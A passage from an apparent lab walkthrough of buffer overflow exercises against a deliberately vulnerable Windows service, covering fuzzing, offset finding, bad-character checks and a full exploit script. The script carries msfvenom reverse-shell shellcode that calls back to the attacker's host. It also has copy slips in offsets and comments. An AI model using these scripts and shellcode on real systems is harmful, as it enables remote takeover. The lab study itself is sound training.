payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfe\xff"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```

![](img/Pasted%20image%2020240829171740.png)


31. Immunity Debugger. Compare using mona.

** Do not restart Immunity Debbuger.

`!mona compare -f C:\mona\oscp\bytearray.bin -a esp

![800](img/Pasted%20image%2020240902180843.png)


32. Immunity Debugger > Debug > Restart


33. Use the command mona jmp, the esp and the excluded bad chars.

`!mona jmp -r esp -cpb "\x00\x16\x2f\xf4\xfd"

Go to View > Log 
Select and double click Log Data

![800](img/Pasted%20image%2020240902181028.png)

Showing ESP 625011AF

![800](img/Pasted%20image%2020240902181048.png)


34. Create shellcode using msfvenom

`msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9009 EXITFUNC=thread -b "\x00\x16\x2f\xf4\xfd" -f python -v "shellcode"


```shell
┌──(root㉿kali)-[/transfer]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9009 EXITFUNC=thread -b "\x00\x16\x2f\xf4\xfd" -f python -v "shellcode"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with Failed to locate a valid permutation.
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor failed with Encoding failed due to a bad character (index=23, char=0xf4)
Attempting to encode payload with 1 iterations of x86/countdown
x86/countdown failed with Encoding failed due to a bad character (index=43, char=0x16)
Attempting to encode payload with 1 iterations of x86/fnstenv_mov
x86/fnstenv_mov failed with Encoding failed due to a bad character (index=8, char=0xf4)
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 353 (iteration=0)
x86/jmp_call_additive chosen with final size 353
Payload size: 353 bytes
Final size of python file: 1990 bytes
shellcode =  b""
shellcode += b"\xfc\xbb\xba\xb9\xe1\x7a\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x46\x51\x63\x7a\xb6\xa2\x04\xf2"
shellcode += b"\x53\x93\x04\x60\x10\x84\xb4\xe2\x74\x29\x3e"
shellcode += b"\xa6\x6c\xba\x32\x6f\x83\x0b\xf8\x49\xaa\x8c"
shellcode += b"\x51\xa9\xad\x0e\xa8\xfe\x0d\x2e\x63\xf3\x4c"
shellcode += b"\x77\x9e\xfe\x1c\x20\xd4\xad\xb0\x45\xa0\x6d"
shellcode += b"\x3b\x15\x24\xf6\xd8\xee\x47\xd7\x4f\x64\x1e"
shellcode += b"\xf7\x6e\xa9\x2a\xbe\x68\xae\x17\x08\x03\x04"
shellcode += b"\xe3\x8b\xc5\x54\x0c\x27\x28\x59\xff\x39\x6d"
shellcode += b"\x5e\xe0\x4f\x87\x9c\x9d\x57\x5c\xde\x79\xdd"
shellcode += b"\x46\x78\x09\x45\xa2\x78\xde\x10\x21\x76\xab"
shellcode += b"\x57\x6d\x9b\x2a\xbb\x06\xa7\xa7\x3a\xc8\x21"
shellcode += b"\xf3\x18\xcc\x6a\xa7\x01\x55\xd7\x06\x3d\x85"
shellcode += b"\xb8\xf7\x9b\xce\x55\xe3\x91\x8d\x31\xc0\x9b"
shellcode += b"\x2d\xc2\x4e\xab\x5e\xf0\xd1\x07\xc8\xb8\x9a"
shellcode += b"\x81\x0f\xbe\xb0\x76\x9f\x41\x3b\x87\xb6\x85"
shellcode += b"\x6f\xd7\xa0\x2c\x10\xbc\x30\xd0\xc5\x13\x60"
shellcode += b"\x7e\xb6\xd3\xd0\x3e\x66\xbc\x3a\xb1\x59\xdc"
shellcode += b"\x45\x1b\xf2\x77\xbc\xcc\xf7\x8c\xff\xf3\x60"
shellcode += b"\x91\xff\x28\x40\x1c\x19\x44\xb2\x48\xb2\xf1"
shellcode += b"\x2b\xd1\x48\x63\xb3\xcf\x35\xa3\x3f\xfc\xca"
shellcode += b"\x6a\xc8\x89\xd8\x1b\x38\xc4\x82\x8a\x47\xf2"
shellcode += b"\xaa\x51\xd5\x99\x2a\x1f\xc6\x35\x7d\x48\x38"
shellcode += b"\x4c\xeb\x64\x63\xe6\x09\x75\xf5\xc1\x89\xa2"
shellcode += b"\xc6\xcc\x10\x26\x72\xeb\x02\xfe\x7b\xb7\x76"
shellcode += b"\xae\x2d\x61\x20\x08\x84\xc3\x9a\xc2\x7b\x8a"
shellcode += b"\x4a\x92\xb7\x0d\x0c\x9b\x9d\xfb\xf0\x2a\x48"
shellcode += b"\xba\x0f\x82\x1c\x4a\x68\xfe\xbc\xb5\xa3\xba"
shellcode += b"\xdd\x57\x61\xb7\x75\xce\xe0\x7a\x18\xf1\xdf"
shellcode += b"\xb9\x25\x72\xd5\x41\xd2\x6a\x9c\x44\x9e\x2c"
shellcode += b"\x4d\x35\x8f\xd8\x71\xea\xb0\xc8\x71\x0c\x4f"
shellcode += b"\xf3"
```


35. Create python script for payload.py

```python
#!/usr/bin/env python3

import socket  # Import the socket library for network communication

# Target IP address and port where the vulnerable service is running
ip = 'target.local'
port = 1337

# Shellcode: This is the payload that will be executed on the target machine
# The shellcode is written in hexadecimal format representing machine instructions

shellcode =  ""
shellcode += "\xfc\xbb\xba\xb9\xe1\x7a\xeb\x0c\x5e\x56\x31"
shellcode += "\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += "\xff\xff\xff\x46\x51\x63\x7a\xb6\xa2\x04\xf2"
shellcode += "\x53\x93\x04\x60\x10\x84\xb4\xe2\x74\x29\x3e"
shellcode += "\xa6\x6c\xba\x32\x6f\x83\x0b\xf8\x49\xaa\x8c"
shellcode += "\x51\xa9\xad\x0e\xa8\xfe\x0d\x2e\x63\xf3\x4c"
shellcode += "\x77\x9e\xfe\x1c\x20\xd4\xad\xb0\x45\xa0\x6d"
shellcode += "\x3b\x15\x24\xf6\xd8\xee\x47\xd7\x4f\x64\x1e"
shellcode += "\xf7\x6e\xa9\x2a\xbe\x68\xae\x17\x08\x03\x04"
shellcode += "\xe3\x8b\xc5\x54\x0c\x27\x28\x59\xff\x39\x6d"
shellcode += "\x5e\xe0\x4f\x87\x9c\x9d\x57\x5c\xde\x79\xdd"
shellcode += "\x46\x78\x09\x45\xa2\x78\xde\x10\x21\x76\xab"
shellcode += "\x57\x6d\x9b\x2a\xbb\x06\xa7\xa7\x3a\xc8\x21"
shellcode += "\xf3\x18\xcc\x6a\xa7\x01\x55\xd7\x06\x3d\x85"
shellcode += "\xb8\xf7\x9b\xce\x55\xe3\x91\x8d\x31\xc0\x9b"
shellcode += "\x2d\xc2\x4e\xab\x5e\xf0\xd1\x07\xc8\xb8\x9a"
shellcode += "\x81\x0f\xbe\xb0\x76\x9f\x41\x3b\x87\xb6\x85"
shellcode += "\x6f\xd7\xa0\x2c\x10\xbc\x30\xd0\xc5\x13\x60"
shellcode += "\x7e\xb6\xd3\xd0\x3e\x66\xbc\x3a\xb1\x59\xdc"
shellcode += "\x45\x1b\xf2\x77\xbc\xcc\xf7\x8c\xff\xf3\x60"
shellcode += "\x91\xff\x28\x40\x1c\x19\x44\xb2\x48\xb2\xf1"
shellcode += "\x2b\xd1\x48\x63\xb3\xcf\x35\xa3\x3f\xfc\xca"
shellcode += "\x6a\xc8\x89\xd8\x1b\x38\xc4\x82\x8a\x47\xf2"
shellcode += "\xaa\x51\xd5\x99\x2a\x1f\xc6\x35\x7d\x48\x38"
shellcode += "\x4c\xeb\x64\x63\xe6\x09\x75\xf5\xc1\x89\xa2"
shellcode += "\xc6\xcc\x10\x26\x72\xeb\x02\xfe\x7b\xb7\x76"
shellcode += "\xae\x2d\x61\x20\x08\x84\xc3\x9a\xc2\x7b\x8a"
shellcode += "\x4a\x92\xb7\x0d\x0c\x9b\x9d\xfb\xf0\x2a\x48"
shellcode += "\xba\x0f\x82\x1c\x4a\x68\xfe\xbc\xb5\xa3\xba"
shellcode += "\xdd\x57\x61\xb7\x75\xce\xe0\x7a\x18\xf1\xdf"
shellcode += "\xb9\x25\x72\xd5\x41\xd2\x6a\x9c\x44\x9e\x2c"
shellcode += "\x4d\x35\x8f\xd8\x71\xea\xb0\xc8\x71\x0c\x4f"
shellcode += "\xf3"

# Command to be sent to the target service. "OVERFLOW4 " is the vulnerable function or command.
Command = "OVERFLOW5 "

# Offset: Buffer of 'A's used to overflow the buffer until the return pointer
Offset = 314 * "A"  # Fills the stack up to the return address (control the EIP)

# jmp: Address of the instruction that redirects execution flow to our shellcode
# "\x03\x11\x50\x62" is the memory address that contains "jmp esp" or a similar instruction
jmp = "\xAF\x11\x50\x62"
    #ESP 625011AF

# NOP sled: Helps guide the execution smoothly into the shellcode by filling with NOP instructions
nops = 16 * "\x90"  # 16 NOP instructions (0x90 is a NOP in x86 architecture)

# Complete exploit string, combining all parts
string = Command + Offset + jmp + shellcode

try:
    # Creating a socket object for TCP communication
    with socket.socket() as s:
        # Attempt to connect to the target IP and port
        s.connect((ip, port))
        print("Sending exploit payload...")
        # Sending the crafted exploit payload
        s.send(bytes(string, 'latin-1'))
        
except Exception as e:
    # If an error occurs during connection or sending, print the error
    print("Failed to connect or send the payload:", e)


```


36. Run nc listener and execute payload

![800](img/Pasted%20image%2020240902181357.png)

![800](img/Pasted%20image%2020240902181406.png)


37. Verify connection, pwnd!

![800](img/Pasted%20image%2020240902181506.png)




# Task 7 oscp.exe - OVERFLOW6

1. In Kali. Using Remmina, remote to target machine.

![800](img/Pasted%20image%2020240821141857.png)


2. In target machine. Right click Immunity Debugger > Run as administrator. File > Open > Desktop\\vulnerable-apps\\oscp\\oscp. Click red play button, will show Running. 

![800](img/Pasted%20image%2020240902173034.png)


4. In Kali. Open a terminal. NC to the target machine with port 1337. Type "HELP" to view the commands. Type "OVERFLOW6 test" to verify.

![800](img/Pasted%20image%2020240902182721.png)


5. In target machine. In the Immunity Debugger. Input the mona command.

`!mona config -set workingfolder c:\mona\%p

![800](img/Pasted%20image%2020240902182755.png)


6. In Kali. Create a script, fuzzer.py.

```python
#!/usr/bin/env python3

import socket, time, sys  # Import necessary modules: socket for networking, time for delays, sys for exiting the script

# Define the target IP address or hostname
ip = "target.local"

# Define the target port number
port = 1337

# Set the timeout duration (in seconds) for the socket connection
timeout = 5

# Define a prefix to prepend to the payload being sent
prefix = "OVERFLOW6 "

# Initialize the payload with the prefix followed by 100 "A" characters
string = prefix + "A" * 100

# Start an infinite loop to continually send increasing payload sizes
while True:
    try:
        # Create a new socket object for IPv4 (AF_INET) and TCP (SOCK_STREAM)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # Set the timeout for the socket connection
            s.settimeout(timeout)
            
            # Connect to the target IP and port
            s.connect((ip, port))
            
            # Receive the initial response from the server (optional step to ensure connection)
            s.recv(1024)
            
            # Print the current size of the payload being sent (excluding the prefix)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            
            # Send the payload to the target server, encoding it as a Latin-1 byte string
            s.send(bytes(string, "latin-1"))
            
            # Receive the server's response (optional step to ensure the payload was sent)
            s.recv(1024)
    
    # If an exception occurs (e.g., the server crashes or connection fails), handle it here
    except:
        # Print the size of the payload that caused the crash and exit the script
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    
    # Increase the size of the payload by 100 "A" characters for the next iteration
    string += 100 * "A"
    
    # Wait 1 second before sending the next payload (to avoid overwhelming the server)
    time.sleep(1)

```


7. In Kali. Create a script, exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW6 "  # The command or identifier expected by the target service
offset = 0             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = ""              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = ""           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details

```


8. In target machine. Immunity Debugger > Debug > Restart > Play.


9. In Kali. Execute the fuzzer.py. The Immunity Debugger will crash and pause.

![800](img/Pasted%20image%2020240902182940.png)


10. Fuzzing crashed at 1100 bytes. Create a pattern by adding 400 bytes, total of 1500 bytes. 

![800](img/Pasted%20image%2020240902183125.png)


11. Immunity Debugger showing EIP 41414141 overwritten with A(hex=41).

![800](img/Pasted%20image%2020240902183147.png)


12. In Kali. Create msf pattern.

`msf-pattern_create -l 1500

```shell
┌──(root㉿kali)-[/transfer]
└─# msf-pattern_create -l 1500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9

```


13. In Kali. Edit the script exploit.py and add the output of the msf-pattern.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW6 "  # The command or identifier expected by the target service
offset = 0             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = ""              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```


14. In target machine. Immunity Debugger > Debug > Restart > Play.


15. In Kali. Execute the exploit.py.

![800](img/Pasted%20image%2020240821150355.png)


16. Immunity Debugger. EIP 35694234.

![800](img/Pasted%20image%2020240902183520.png)


17. In Kali. Get the offset value of the EIP.

```shell
┌──(root㉿kali)-[/transfer]
└─# msf-pattern_offset -l 1500 -q 35694234
[*] Exact match at offset 1034

```

EIP Offset is 314.

	Task 7
		a. What is the EIP offset for OVERFLOW6?
			1034


18. In Kali. Edit the exploit.py. Add the offset 1034 and put a retn to be reflected, can use "BBBB"

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW6 "  # The command or identifier expected by the target service
offset = 1034            # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details

```


19. In target machine. Immunity Debugger > Debug > Restart > Play.


20. In Kali. Execute exploit.py.

![800](img/Pasted%20image%2020240821152534.png)


21. Immunity Debugger. Note the value ESP 018EF608.

![800](img/Pasted%20image%2020240902183848.png)


